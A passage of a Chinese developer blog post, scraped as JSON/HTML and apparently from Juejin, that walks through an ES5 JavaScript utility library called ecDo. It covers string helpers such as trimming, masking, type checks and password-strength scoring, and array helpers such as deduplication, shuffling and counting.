noreferrer\">github地址</a></p>\n<p><a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fwww.npmjs.com%2Fpackage%2Fvue-security-code\" rel=\"nofollow noopener noreferrer\">npm地址</a></p>\n</div>"},{"title":"编写自己的代码库（javascript常用实例的实现与封装）","avatar":"https://user-gold-cdn.xitu.io/2017/7/18/64d82b70650d11ed806f611d929c7b1e?imageView2/1/w/100/h/100/q/85/format/webp/interlace/1","author":"守候i","create_time":"2017 年 12 月 11 日","tags":["JavaScript"],"content":"<div data-v-13f76525=\"\" data-v-3f216172=\"\" class=\"entry-content post-content juejin-image-viewer__container\"><div><h2 data-id=\"heading-0\">1.前言</h2>\n<p>大家在开发的时候应该知道，有很多常见的实例操作。比如数组去重，关键词高亮，打乱数组等。这些操作，代码一般不会很多，实现的逻辑也不会很难，下面的代码，我解释就不解释太多了，打上注释，相信大家就会懂了。但是，用的地方会比较，如果项目有哪个地方需要用，如果重复写的话，就是代码沉余，开发效率也不用，复用基本就是复制粘贴！这样是一个很不好的习惯，大家可以考虑一下把一些常见的操作封装成函数，调用的时候，直接调用就好！<br>源码都放在github上了，大家想以后以后有什么修改或者增加的，欢迎大家来star一下<a href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2FchenhuiYj%2Fec-do\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">ec-do</a>。</p>\n<blockquote>\n  <p>1.下面代码，我放的是es5版本的，如果大家需要看es6版本的，请移步<a href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2FchenhuiYj%2Fec-do%2Fblob%2Fmaster%2Fsrc%2Fec-do-2.0.0.js\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">ec-do2.0.0.js</a></p>\n  <p>2.想看完整代码的，或者部分实例的demo，建议去github看！</p>\n  <p>3.下面的代码，都是封装在ecDo这个对象里面，如果里面有this，除了特别说明的，都是指向ecDo</p>\n</blockquote>\n<h2 data-id=\"heading-1\">2.字符串操作</h2>\n<h3 data-id=\"heading-2\">2-1去除字符串空格</h3>\n<pre class=\"hljs bash\"><code>//去除空格  <span class=\"hljs-built_in\">type</span> 1-所有空格  2-前后空格  3-前空格 4-后空格\n//ecDo.trim(<span class=\"hljs-string\">'  1235asd'</span>,1)\n//result：1235asd\n//这个方法有原生的方案代替，但是考虑到有时候开发PC站需要兼容IE8，所以就还是继续保留\ntrim: <span class=\"hljs-keyword\">function</span> (str, <span class=\"hljs-built_in\">type</span>) {\n    switch (<span class=\"hljs-built_in\">type</span>) {\n        <span class=\"hljs-keyword\">case</span> 1:\n            <span class=\"hljs-built_in\">return</span> str.replace(/\\s+/g, <span class=\"hljs-string\">\"\"</span>);\n        <span class=\"hljs-keyword\">case</span> 2:\n            <span class=\"hljs-built_in\">return</span> str.replace(/(^\\s*)|(\\s*$)/g, <span class=\"hljs-string\">\"\"</span>);\n        <span class=\"hljs-keyword\">case</span> 3:\n            <span class=\"hljs-built_in\">return</span> str.replace(/(^\\s*)/g, <span class=\"hljs-string\">\"\"</span>);\n        <span class=\"hljs-keyword\">case</span> 4:\n            <span class=\"hljs-built_in\">return</span> str.replace(/(\\s*$)/g, <span class=\"hljs-string\">\"\"</span>);\n        default:\n            <span class=\"hljs-built_in\">return</span> str;\n    }\n}\n</code></pre>\n<h3 data-id=\"heading-3\">2-2字母大小写切换</h3>\n<pre class=\"hljs bash\"><code>/*<span class=\"hljs-built_in\">type</span>\n 1:首字母大写\n 2：首页母小写\n 3：大小写转换\n 4：全部大写\n 5：全部小写\n * */\n//ecDo.changeCase(<span class=\"hljs-string\">'asdasd'</span>,1)\n//result：Asdasd\nchangeCase: <span class=\"hljs-keyword\">function</span> (str, <span class=\"hljs-built_in\">type</span>) {\n    <span class=\"hljs-keyword\">function</span> ToggleCase(str) {\n        var itemText = <span class=\"hljs-string\">\"\"</span>\n        str.split(<span class=\"hljs-string\">\"\"</span>).forEach(\n            <span class=\"hljs-keyword\">function</span> (item) {\n                <span class=\"hljs-keyword\">if</span> (/^([a-z]+)/.test(item)) {\n                    itemText += item.toUpperCase();\n                } <span class=\"hljs-keyword\">else</span> <span class=\"hljs-keyword\">if</span> (/^([A-Z]+)/.test(item)) {\n                    itemText += item.toLowerCase();\n                } <span class=\"hljs-keyword\">else</span> {\n                    itemText += item;\n                }\n            });\n        <span class=\"hljs-built_in\">return</span> itemText;\n    }\n    switch (<span class=\"hljs-built_in\">type</span>) {\n        <span class=\"hljs-keyword\">case</span> 1:\n            <span class=\"hljs-built_in\">return</span> str.replace(/\\b\\w+\\b/g, <span class=\"hljs-keyword\">function</span> (word) {\n                <span class=\"hljs-built_in\">return</span> word.substring(0, 1).toUpperCase() + word.substring(1).toLowerCase();\n            });\n        <span class=\"hljs-keyword\">case</span> 2:\n            <span class=\"hljs-built_in\">return</span> str.replace(/\\b\\w+\\b/g, <span class=\"hljs-keyword\">function</span> (word) {\n                <span class=\"hljs-built_in\">return</span> word.substring(0, 1).toLowerCase() + word.substring(1).toUpperCase();\n            });\n        <span class=\"hljs-keyword\">case</span> 3:\n            <span class=\"hljs-built_in\">return</span> ToggleCase(str);\n        <span class=\"hljs-keyword\">case</span> 4:\n            <span class=\"hljs-built_in\">return</span> str.toUpperCase();\n        <span class=\"hljs-keyword\">case</span> 5:\n            <span class=\"hljs-built_in\">return</span> str.toLowerCase();\n        default:\n            <span class=\"hljs-built_in\">return</span> str;\n    }\n}\n</code></pre>\n<h3 data-id=\"heading-4\">2-3字符串循环复制</h3>\n<pre class=\"hljs bash\"><code>//repeatStr(str-&gt;字符串, count-&gt;次数)\n//ecDo.repeatStr(<span class=\"hljs-string\">'123'</span>,3)\n//<span class=\"hljs-string\">\"result：123123123\"</span>\nrepeatStr: <span class=\"hljs-keyword\">function</span> (str, count) {\n    var text = <span class=\"hljs-string\">''</span>;\n    <span class=\"hljs-keyword\">for</span> (var i = 0; i &lt; count; i++) {\n        text += str;\n    }\n    <span class=\"hljs-built_in\">return</span> text;\n}\n</code></pre>\n<h3 data-id=\"heading-5\">2-4字符串替换</h3>\n<pre class=\"hljs bash\"><code>//ecDo.replaceAll(<span class=\"hljs-string\">'这里是上海，中国第三大城市，广东省省会，简称穗，'</span>,<span class=\"hljs-string\">'上海'</span>,<span class=\"hljs-string\">'广州'</span>)\n//result：<span class=\"hljs-string\">\"这里是广州，中国第三大城市，广东省省会，简称穗，\"</span>\nreplaceAll: <span class=\"hljs-keyword\">function</span> (str, AFindText, ARepText) {\n    raRegExp = new RegExp(AFindText, <span class=\"hljs-string\">\"g\"</span>);\n    <span class=\"hljs-built_in\">return</span> str.replace(raRegExp, ARepText);\n}\n</code></pre>\n<h3 data-id=\"heading-6\">2-5替换*&nbsp;</h3>\n<pre class=\"hljs bash\"><code>//字符替换*\n//replaceStr(字符串,字符格式, 替换方式,替换的字符（默认*）)\n//ecDo.replaceStr(<span class=\"hljs-string\">'18819322663'</span>,[3,5,3],0)\n//result：188*****663\n//ecDo.replaceStr(<span class=\"hljs-string\">'asdasdasdaa'</span>,[3,5,3],1)\n//result：***asdas***\n//ecDo.replaceStr(<span class=\"hljs-string\">'1asd88465asdwqe3'</span>,[5],0)\n//result：*****8465asdwqe3\n//ecDo.replaceStr(<span class=\"hljs-string\">'1asd88465asdwqe3'</span>,[5],1,<span class=\"hljs-string\">'+'</span>)\n//result：<span class=\"hljs-string\">\"1asd88465as+++++\"</span>\nreplaceStr: <span class=\"hljs-keyword\">function</span> (str, regArr, <span class=\"hljs-built_in\">type</span>, ARepText) {\n    var regtext = <span class=\"hljs-string\">''</span>,\n        Reg = null,\n        replaceText = ARepText || <span class=\"hljs-string\">'*'</span>;\n    //repeatStr是在上面定义过的（字符串循环复制），大家注意哦\n    <span class=\"hljs-keyword\">if</span> (regArr.length === 3 &amp;&amp; <span class=\"hljs-built_in\">type</span> === 0) {\n        regtext = <span class=\"hljs-string\">'(\\\\w{'</span> + regArr[0] + <span class=\"hljs-string\">'})\\\\w{'</span> + regArr[1] + <span class=\"hljs-string\">'}(\\\\w{'</span> + regArr[2] + <span class=\"hljs-string\">'})'</span>\n        Reg = new RegExp(regtext);\n        var replaceCount = this.repeatStr(replaceText, regArr[1]);\n        <span class=\"hljs-built_in\">return</span> str.replace(Reg, <span class=\"hljs-string\">'$1'</span> + replaceCount + <span class=\"hljs-string\">'$2'</span>)\n    }\n    <span class=\"hljs-keyword\">else</span> <span class=\"hljs-keyword\">if</span> (regArr.length === 3 &amp;&amp; <span class=\"hljs-built_in\">type</span> === 1) {\n        regtext = <span class=\"hljs-string\">'\\\\w{'</span> + regArr[0] + <span class=\"hljs-string\">'}(\\\\w{'</span> + regArr[1] + <span class=\"hljs-string\">'})\\\\w{'</span> + regArr[2] + <span class=\"hljs-string\">'}'</span>\n        Reg = new RegExp(regtext);\n        var replaceCount1 = this.repeatStr(replaceText, regArr[0]);\n        var replaceCount2 = this.repeatStr(replaceText, regArr[2]);\n        <span class=\"hljs-built_in\">return</span> str.replace(Reg, replaceCount1 + <span class=\"hljs-string\">'$1'</span> + replaceCount2)\n    }\n    <span class=\"hljs-keyword\">else</span> <span class=\"hljs-keyword\">if</span> (regArr.length === 1 &amp;&amp; <span class=\"hljs-built_in\">type</span> === 0) {\n        regtext = <span class=\"hljs-string\">'(^\\\\w{'</span> + regArr[0] + <span class=\"hljs-string\">'})'</span>\n        Reg = new RegExp(regtext);\n        var replaceCount = this.repeatStr(replaceText, regArr[0]);\n        <span class=\"hljs-built_in\">return</span> str.replace(Reg, replaceCount)\n    }\n    <span class=\"hljs-keyword\">else</span> <span class=\"hljs-keyword\">if</span> (regArr.length === 1 &amp;&amp; <span class=\"hljs-built_in\">type</span> === 1) {\n        regtext = <span class=\"hljs-string\">'(\\\\w{'</span> + regArr[0] + <span class=\"hljs-string\">'}$)'</span>\n        Reg = new RegExp(regtext);\n        var replaceCount = this.repeatStr(replaceText, regArr[0]);\n        <span class=\"hljs-built_in\">return</span> str.replace(Reg, replaceCount)\n    }\n}\n</code></pre>\n<h3 data-id=\"heading-7\">2-6检测字符串</h3>\n<pre class=\"hljs bash\"><code>//检测字符串\n//ecDo.checkType(<span class=\"hljs-string\">'165226226326'</span>,<span class=\"hljs-string\">'phone'</span>)\n//result：<span class=\"hljs-literal\">false</span>\n//大家可以根据需要扩展\ncheckType: <span class=\"hljs-keyword\">function</span> (str, <span class=\"hljs-built_in\">type</span>) {\n    switch (<span class=\"hljs-built_in\">type</span>) {\n        <span class=\"hljs-keyword\">case</span> <span class=\"hljs-string\">'email'</span>:\n            <span class=\"hljs-built_in\">return</span> /^[\\w-]+(\\.[\\w-]+)*@[\\w-]+(\\.[\\w-]+)+$/.test(str);\n        <span class=\"hljs-keyword\">case</span> <span class=\"hljs-string\">'phone'</span>:\n            <span class=\"hljs-built_in\">return</span> /^1[3|4|5|7|8][0-9]{9}$/.test(str);\n        <span class=\"hljs-keyword\">case</span> <span class=\"hljs-string\">'tel'</span>:\n            <span class=\"hljs-built_in\">return</span> /^(0\\d{2,3}-\\d{7,8})(-\\d{1,4})?$/.test(str);\n        <span class=\"hljs-keyword\">case</span> <span class=\"hljs-string\">'number'</span>:\n            <span class=\"hljs-built_in\">return</span> /^[0-9]$/.test(str);\n        <span class=\"hljs-keyword\">case</span> <span class=\"hljs-string\">'english'</span>:\n            <span class=\"hljs-built_in\">return</span> /^[a-zA-Z]+$/.test(str);\n        <span class=\"hljs-keyword\">case</span> <span class=\"hljs-string\">'text'</span>:\n            <span class=\"hljs-built_in\">return</span> /^\\w+$/.test(str);\n        <span class=\"hljs-keyword\">case</span> <span class=\"hljs-string\">'chinese'</span>:\n            <span class=\"hljs-built_in\">return</span> /^[\\u4E00-\\u9FA5]+$/.test(str);\n        <span class=\"hljs-keyword\">case</span> <span class=\"hljs-string\">'lower'</span>:\n            <span class=\"hljs-built_in\">return</span> /^[a-z]+$/.test(str);\n        <span class=\"hljs-keyword\">case</span> <span class=\"hljs-string\">'upper'</span>:\n            <span class=\"hljs-built_in\">return</span> /^[A-Z]+$/.test(str);\n        default:\n            <span class=\"hljs-built_in\">return</span> <span class=\"hljs-literal\">true</span>;\n    }\n}\n</code></pre>\n<h3 data-id=\"heading-8\">2-7 检测密码强度</h3>\n<pre class=\"hljs bash\"><code>//ecDo.checkPwd(<span class=\"hljs-string\">'12asdASAD'</span>)\n//result：3(强度等级为3)\ncheckPwd: <span class=\"hljs-keyword\">function</span> (str) {\n    var nowLv = 0;\n    <span class=\"hljs-keyword\">if</span> (str.length &lt; 6) {\n        <span class=\"hljs-built_in\">return</span> nowLv\n    }\n    <span class=\"hljs-keyword\">if</span> (/[0-9]/.test(str)) {\n        nowLv++\n    }\n    <span class=\"hljs-keyword\">if</span> (/[a-z]/.test(str)) {\n        nowLv++\n    }\n    <span class=\"hljs-keyword\">if</span> (/[A-Z]/.test(str)) {\n        nowLv++\n    }\n    <span class=\"hljs-keyword\">if</span> (/[\\.|-|_]/.test(str)) {\n        nowLv++\n    }\n    <span class=\"hljs-built_in\">return</span> nowLv;\n}\n</code></pre>\n<h3 data-id=\"heading-9\">2-8随机码（toString详解）</h3>\n<pre class=\"hljs bash\"><code>//count取值范围0-36\n//ecDo.randomWord(10)\n//result：<span class=\"hljs-string\">\"2584316588472575\"</span>\n//ecDo.randomWord(14)\n//result：<span class=\"hljs-string\">\"9b405070dd00122640c192caab84537\"</span>\n//ecDo.randomWord(36)\n//result：<span class=\"hljs-string\">\"83vhdx10rmjkyb9\"</span>\nrandomWord: <span class=\"hljs-keyword\">function</span> (count) {\n    <span class=\"hljs-built_in\">return</span> Math.random().toString(count).substring(2);\n}\n</code></pre>\n<h3 data-id=\"heading-10\">2-9查找字符串</h3>\n<p>可能标题会有点误导，下面我就简单说明一个需求，在字符串<code>'sad44654blog5a1sd67as9dablog4s5d16zxc4sdweasjkblogwqepaskdkblogahseiuadbhjcibloguyeajzxkcabloguyiwezxc967'</code>中找出'blog'的出现次数。代码如下</p>\n<pre class=\"hljs bash\"><code>//var strTest=<span class=\"hljs-string\">'sad44654blog5a1sd67as9dablog4s5d16zxc4sdweasjkblogwqepaskdkblogahseiuadbhjcibloguyeajzxkcabloguyiwezxc967'</span>\n//ecDo.countStr(strTest,<span class=\"hljs-string\">'blog'</span>)\n//result：6\ncountStr: <span class=\"hljs-keyword\">function</span> (str, strSplit) {\n    <span class=\"hljs-built_in\">return</span> str.split(strSplit).length - 1\n}\n</code></pre>\n<h3 data-id=\"heading-11\">2-10 过滤字符串&nbsp;</h3>\n<pre class=\"hljs bash\"><code>//过滤字符串(html标签，表情，特殊字符)\n//字符串，替换内容（special-特殊字符,html-html标签,emjoy-emjoy表情,word-小写字母，WORD-大写字母，number-数字,chinese-中文），要替换成什么，默认<span class=\"hljs-string\">''</span>,保留哪些特殊字符\n//如果需要过滤多种字符，<span class=\"hljs-built_in\">type</span>参数使用,分割，如下栗子\n//过滤字符串的html标签，大写字母，中文，特殊字符，全部替换成*,但是特殊字符<span class=\"hljs-string\">'%'</span>，<span class=\"hljs-string\">'?'</span>，除了这两个，其他特殊字符全部清除\n//var str=<span class=\"hljs-string\">'asd    654a大蠢sasdasdASDQWEXZC6d5#%^*^&amp;*^%^&amp;*$\\\\\"\\'</span><span class=\"hljs-comment\">#@!()*/-())_\\'\":\"{}?&lt;div&gt;&lt;/div&gt;&lt;img src=\"\"/&gt;啊实打实大蠢猪自行车这些课程';</span>\n// ecDo.filterStr(str,<span class=\"hljs-string\">'html,WORD,chinese,special'</span>,<span class=\"hljs-string\">'*'</span>,<span class=\"hljs-string\">'%?'</span>)\n//result：<span class=\"hljs-string\">\"asd    654a**sasdasd*********6d5#%^*^&amp;*^%^&amp;*$\\\"'#@!()*/-())_'\"</span>:<span class=\"hljs-string\">\"{}?*****************\"</span>\nfilterStr: <span class=\"hljs-keyword\">function</span> (str, <span class=\"hljs-built_in\">type</span>, restr, spstr) {\n    var <span class=\"hljs-built_in\">type</span>Arr = type.split(<span class=\"hljs-string\">','</span>), _str = str;\n    <span class=\"hljs-keyword\">for</span> (var i = 0, len = <span class=\"hljs-built_in\">type</span>Arr.length; i &lt; len; i++) {\n        //是否是过滤特殊符号\n        <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-built_in\">type</span>Arr[i] === <span class=\"hljs-string\">'special'</span>) {\n            var pattern, regText = <span class=\"hljs-string\">'$()[]{}?\\|^*+./\\\"\\'</span>+<span class=\"hljs-string\">';\n            //是否有哪些特殊符号需要保留\n            if (spstr) {\n                var _spstr = spstr.split(\"\"), _regText = \"[^0-9A-Za-z\\\\s\";\n                for (var j = 0, len1 = _spstr.length; j &lt; len1; j++) {\n                    if (regText.indexOf(_spstr[j]) === -1) {\n                        _regText += _spstr[j];\n                    }\n                    else {\n                        _regText += '</span>\\\\<span class=\"hljs-string\">' + _spstr[j];\n                    }\n                }\n                _regText += '</span>]<span class=\"hljs-string\">'\n                pattern = new RegExp(_regText, '</span>g<span class=\"hljs-string\">');\n            }\n            else {\n                pattern = new RegExp(\"[^0-9A-Za-z\\\\s]\", '</span>g<span class=\"hljs-string\">')\n            }\n        }\n        var _restr = restr || '</span><span class=\"hljs-string\">';\n        switch (typeArr[i]) {\n            case '</span>special<span class=\"hljs-string\">':\n                _str = _str.replace(pattern, _restr);\n                break;\n            case '</span>html<span class=\"hljs-string\">':\n                _str = _str.replace(/&lt;\\/?[^&gt;]*&gt;/g, _restr);\n                break;\n            case '</span>emjoy<span class=\"hljs-string\">':\n                _str = _str.replace(/[^\\u4e00-\\u9fa5|\\u0000-\\u00ff|\\u3002|\\uFF1F|\\uFF01|\\uff0c|\\u3001|\\uff1b|\\uff1a|\\u3008-\\u300f|\\u2018|\\u2019|\\u201c|\\u201d|\\uff08|\\uff09|\\u2014|\\u2026|\\u2013|\\uff0e]/g, _restr);\n                break;\n            case '</span>word<span class=\"hljs-string\">':\n                _str = _str.replace(/[a-z]/g, _restr);\n                break;\n            case '</span>WORD<span class=\"hljs-string\">':\n                _str = _str.replace(/[A-Z]/g, _restr);\n                break;\n            case '</span>number<span class=\"hljs-string\">':\n                _str = _str.replace(/[0-9]/g, _restr);\n                break;\n            case '</span>chinese<span class=\"hljs-string\">':\n                _str = _str.replace(/[\\u4E00-\\u9FA5]/g, _restr);\n                break;\n        }\n    }\n    return _str;\n}\n</span></code></pre>\n<h3 data-id=\"heading-12\">2-11格式化处理字符串</h3>\n<pre class=\"hljs bash\"><code>//ecDo.formatText(<span class=\"hljs-string\">'1234asda567asd890'</span>)\n//result：<span class=\"hljs-string\">\"12,34a,sda,567,asd,890\"</span>\n//ecDo.formatText(<span class=\"hljs-string\">'1234asda567asd890'</span>,4,<span class=\"hljs-string\">' '</span>)\n//result：<span class=\"hljs-string\">\"1 234a sda5 67as d890\"</span>\n//ecDo.formatText(<span class=\"hljs-string\">'1234asda567asd890'</span>,4,<span class=\"hljs-string\">'-'</span>)\n//result：<span class=\"hljs-string\">\"1-234a-sda5-67as-d890\"</span>\nformatText: <span class=\"hljs-keyword\">function</span> (str, size, delimiter) {\n    var _size = size || 3, _delimiter = delimiter || <span class=\"hljs-string\">','</span>;\n    var regText = <span class=\"hljs-string\">'\\\\B(?=(\\\\w{'</span> + _size + <span class=\"hljs-string\">'})+(?!\\\\w))'</span>;\n    var reg = new RegExp(regText, <span class=\"hljs-string\">'g'</span>);\n    <span class=\"hljs-built_in\">return</span> str.replace(reg, _delimiter);\n}\n</code></pre>\n<h3 data-id=\"heading-13\">2-12找出最长单词</h3>\n<pre class=\"hljs bash\"><code>//ecDo.longestWord(<span class=\"hljs-string\">'Find the Longest word in a String'</span>)\n//result：7\n//ecDo.longestWord(<span class=\"hljs-string\">'Find|the|Longest|word|in|a|String'</span>,<span class=\"hljs-string\">'|'</span>)\n//result：7\nlongestWord: <span class=\"hljs-keyword\">function</span> (str, splitType) {\n    var _splitType = splitType || /\\s+/g,\n        _max = 0,_item=<span class=\"hljs-string\">''</span>;\n    var strArr = str.split(_splitType);\n    strArr.forEach(<span class=\"hljs-keyword\">function</span> (item) {\n        <span class=\"hljs-keyword\">if</span> (_max &lt; item.length) {\n            _max = item.length\n            _item=item;\n        }\n    })\n    <span class=\"hljs-built_in\">return</span> {el:_item,max:_max};\n}\n</code></pre>\n<h3 data-id=\"heading-14\">2-13句中单词首字母大写&nbsp;</h3>\n<pre class=\"hljs bash\"><code>//这个我也一直在纠结，英文标题，即使是首字母大写，也未必每一个单词的首字母都是大写的，但是又不知道哪些应该大写，哪些不应该大写\n//ecDo.titleCaseUp(<span class=\"hljs-string\">'this is a title'</span>)\n//<span class=\"hljs-string\">\"This Is A Title\"</span>\ntitleCaseUp: <span class=\"hljs-keyword\">function</span> (str, splitType) {\n    var _splitType = splitType || /\\s+/g;\n    var strArr = str.split(_splitType),\n        result = <span class=\"hljs-string\">\"\"</span>, _this = this\n    strArr.forEach(<span class=\"hljs-keyword\">function</span> (item) {\n        result += _this.changeCase(item, 1) + <span class=\"hljs-string\">' '</span>;\n    })\n    <span class=\"hljs-built_in\">return</span> this.trim(result, 4)\n}  \n</code></pre>\n<h2 data-id=\"heading-15\">3.数组操作</h2>\n<h3 data-id=\"heading-16\">3-1数组去重</h3>\n<pre class=\"hljs bash\"><code>removeRepeatArray: <span class=\"hljs-keyword\">function</span> (arr) {\n    <span class=\"hljs-built_in\">return</span> arr.filter(<span class=\"hljs-keyword\">function</span> (item, index, self) {\n        <span class=\"hljs-built_in\">return</span> self.indexOf(item) === index;\n    });\n}\n</code></pre>\n<h3 data-id=\"heading-17\">3-2数组顺序打乱</h3>\n<pre class=\"hljs bash\"><code>upsetArr: <span class=\"hljs-keyword\">function</span> (arr) {\n    <span class=\"hljs-built_in\">return</span> arr.sort(<span class=\"hljs-function\"><span class=\"hljs-title\">function</span></span> () {\n        <span class=\"hljs-built_in\">return</span> Math.random() - 0.5\n    });\n},\n</code></pre>\n<h3 data-id=\"heading-18\">3-3数组最大值最小值</h3>\n<pre class=\"hljs bash\"><code>//数组最大值\nmaxArr: <span class=\"hljs-keyword\">function</span> (arr) {\n    <span class=\"hljs-built_in\">return</span> Math.max.apply(null, arr);\n},\n//数组最小值\nminArr: <span class=\"hljs-keyword\">function</span> (arr) {\n    <span class=\"hljs-built_in\">return</span> Math.min.apply(null, arr);\n}\n</code></pre>\n<h3 data-id=\"heading-19\">3-4数组求和，平均值</h3>\n<pre class=\"hljs bash\"><code>//这一块的封装，主要是针对数字类型的数组\n//求和\nsumArr: <span class=\"hljs-keyword\">function</span> (arr) {\n    <span class=\"hljs-built_in\">return</span> arr.reduce(<span class=\"hljs-keyword\">function</span> (pre, cur) {\n        <span class=\"hljs-built_in\">return</span> pre + cur\n    })\n}\n//数组平均值,小数点可能会有很多位，这里不做处理，处理了使用就不灵活！\ncovArr: <span class=\"hljs-keyword\">function</span> (arr) {\n    <span class=\"hljs-built_in\">return</span> this.sumArr(arr) / arr.length;\n},\n</code></pre>\n<h3 data-id=\"heading-20\">3-5从数组中随机获取元素</h3>\n<pre class=\"hljs bash\"><code>//ecDo.randomOne([1,2,3,6,8,5,4,2,6])\n//2\n//ecDo.randomOne([1,2,3,6,8,5,4,2,6])\n//8\n//ecDo.randomOne([1,2,3,6,8,5,4,2,6])\n//8\n//ecDo.randomOne([1,2,3,6,8,5,4,2,6])\n//1\nrandomOne: <span class=\"hljs-keyword\">function</span> (arr) {\n    <span class=\"hljs-built_in\">return</span> arr[Math.floor(Math.random() * arr.length)];\n}\n</code></pre>\n<h3 data-id=\"heading-21\">3-6返回数组（字符串）一个元素出现的次数</h3>\n<pre class=\"hljs bash\"><code>//ecDo.getEleCount(<span class=\"hljs-string\">'asd56+asdasdwqe'</span>,<span class=\"hljs-string\">'a'</span>)\n//result：3\n//ecDo.getEleCount([1,2,3,4,5,66,77,22,55,22],22)\n//result：2\ngetEleCount: <span class=\"hljs-keyword\">function</span> (obj, ele) {\n    var num = 0;\n    <span class=\"hljs-keyword\">for</span> (var i = 0, len = obj.length; i &lt; len; i++) {\n        <span class=\"hljs-keyword\">if</span> (ele === obj[i]) {\n            num++;\n        }\n    }\n    <span class=\"hljs-built_in\">return</span> num;\n}\n</code></pre>\n<h3 data-id=\"heading-22\">3-7返回数组（字符串）出现最多的几次元素和出现次数 ###</h3>\n<pre class=\"hljs bash\"><code>//arr, rank-&gt;长度，默认为数组长度，ranktype，排序方式，默认降序\n//返回值：el-&gt;元素，count-&gt;次数\n//ecDo.getCount([1,2,3,1,2,5,2,4,1,2,6,2,1,3,2])\n//默认情况，返回所有元素出现的次数\n//result：[{<span class=\"hljs-string\">\"el\"</span>:<span class=\"hljs-string\">\"2\"</span>,<span class=\"hljs-string\">\"count\"</span>:6},{<span class=\"hljs-string\">\"el\"</span>:<span class=\"hljs-string\">\"1\"</span>,<span class=\"hljs-string\">\"count\"</span>:4},{<span class=\"hljs-string\">\"el\"</span>:<span class=\"hljs-string\">\"3\"</span>,<span class=\"hljs-string\">\"count\"</span>:2},{<span class=\"hljs-string\">\"el\"</span>:<span class=\"hljs-string\">\"4\"</span>,<span class=\"hljs-string\">\"count\"</span>:1},{<span class=\"hljs-string\">\"el\"</span>:<span class=\"hljs-string\">\"5\"</span>,<span class=\"hljs-string\">\"count\"</span>:1},{<span class=\"hljs-string\">\"el\"</span>:<span class=\"hljs-string\">\"6\"</span>,<span class=\"hljs-string\">\"count\"</span>:1}]\n//ecDo.getCount([1,2,3,1,2,5,2,4,1,2,6,2,1,3,2],3)\n//传参（rank=3），只返回出现次数排序前三的\n//result：[{<span class=\"hljs-string\">\"el\"</span>:<span class=\"hljs-string\">\"2\"</span>,<span class=\"hljs-string\">\"count\"</span>:6},{<span class=\"hljs-string\">\"el\"</span>:<span class=\"hljs-string\">\"1\"</span>,<span class=\"hljs-string\">\"count\"</span>:4},{<span class=\"hljs-string\">\"el\"</span>:<span class=\"hljs-string\">\"3\"</span>,<span class=\"hljs-string\">\"count\"</span>:2}]\n//ecDo.getCount([1,2,3,1,2,5,2,4,1,2,6,2,1,3,2],null,1)\n//传参（ranktype=1,rank=null），升序返回所有元素出现次数\n//result：[{<span class=\"hljs-string\">\"el\"</span>:<span class=\"hljs-string\">\"6\"</span>,<span class=\"hljs-string\">\"count\"</span>:1},{<span class=\"hljs-string\">\"el\"</span>:<span class=\"hljs-string\">\"5\"</span>,<span class=\"hljs-string\">\"count\"</span>:1},{<span class=\"hljs-string\">\"el\"</span>:<span class=\"hljs-string\">\"4\"</span>,<span class=\"hljs-string\">\"count\"</span>:1},{<span class=\"hljs-string\">\"el\"</span>:<span class=\"hljs-string\">\"3\"</span>,<span class=\"hljs-string\">\"count\"</span>:2},{<span class=\"hljs-string\">\"el\"</span>:<span class=\"hljs-string\">\"1\"</span>,<span class=\"hljs-string\">\"count\"</span>:4},{<span class=\"hljs-string\">\"el\"</span>:<span class=\"hljs-string\">\"2\"</span>,<span class=\"hljs-string\">\"count\"</span>:6}]\n//ecDo.getCount([1,2,3,1,2,5,2,4,1,2,6,2,1,3,2],3,1)\n//传参（rank=3，ranktype=1），只返回出现次数排序（升序）前三的\n//result：[{<span class=\"hljs-string\">\"el\"</span>:<span class=\"hljs-string\">\"6\"</span>,<span class=\"hljs-string\">\"count\"</span>:1},{<span class=\"hljs-string\">\"el\"</span>:<span class=\"hljs-string\">\"5\"</span>,<span class=\"hljs-string\">\"count\"</span>:1},{<span class=\"hljs-string\">\"el\"</span>:<span class=\"hljs-string\">\"4\"</span>,<span class=\"hljs-string\">\"count\"</span>:1}]\ngetCount: <span class=\"hljs-keyword\">function</span> (arr, rank, ranktype) {\n    var obj = {},\n        k, arr1 = []\n    //记录每一元素出现的次数\n    <span class=\"hljs-keyword\">for</span> (var i = 0, len = arr.length; i &lt; len; i++) {\n        k = arr[i];\n        <span class=\"hljs-keyword\">if</span> (obj[k]) {\n            obj[k]++;\n        } <span class=\"hljs-keyword\">else</span> {\n            obj[k] = 1;\n        }\n    }\n    //保存结果{el-<span class=\"hljs-string\">'元素'</span>，count-出现次数}\n    <span class=\"hljs-keyword\">for</span> (var o <span class=\"hljs-keyword\">in</span> obj) {\n        arr1.push({el: o, count: obj[o]});\n    }\n    //排序（降序）\n    arr1.sort(<span class=\"hljs-keyword\">function</span> (n1, n2) {\n        <span class=\"hljs-built_in\">return</span> n2.count - n1.count\n    });\n    //如果ranktype为1，则为升序，反转数组\n    <span class=\"hljs-keyword\">if</span> (ranktype === 1) {\n        arr1 = arr1.reverse();\n    }\n    var rank1 = rank || arr1.length;\n    <span class=\"hljs-built_in\">return</span> arr1.slice(0, rank1);\n}\n</code></pre>\n<h3 data-id=\"heading-23\">3-8得到n1-n2下标的数组</h3>\n<pre class=\"hljs bash\"><code>//ecDo.getArrayNum([0,1,2,3,4,5,6,7,8,9],5,9)\n//result：[5, 6, 7, 8, 9]\n//getArrayNum([0,1,2,3,4,5,6,7,8,9],2) //不传第二个参数,默认返回从n1到数组结束的元素\n//result：[2, 3, 4, 5, 6, 7, 8, 9]\ngetArrayNum: <span class=\"hljs-keyword\">function</span> (arr, n1, n2) {\n    <span class=\"hljs-built_in\">return</span> arr.slice(n1, n2);\n}\n</code></pre>\n<h3 data-id=\"heading-24\">3-9筛选数组</h3>\n<pre class=\"hljs bash\"><code>//删除值为<span class=\"hljs-string\">'val'</span>的数组元素\n//ecDo.removeArrayForValue([<span class=\"hljs-string\">'test'</span>,<span class=\"hljs-string\">'test1'</span>,<span class=\"hljs-string\">'test2'</span>,<span class=\"hljs-string\">'test'</span>,<span class=\"hljs-string\">'aaa'</span>],<span class=\"hljs-string\">'test'</span>,<span class=\"hljs-string\">')\n//result：[\"aaa\"]   带有'</span><span class=\"hljs-built_in\">test</span><span 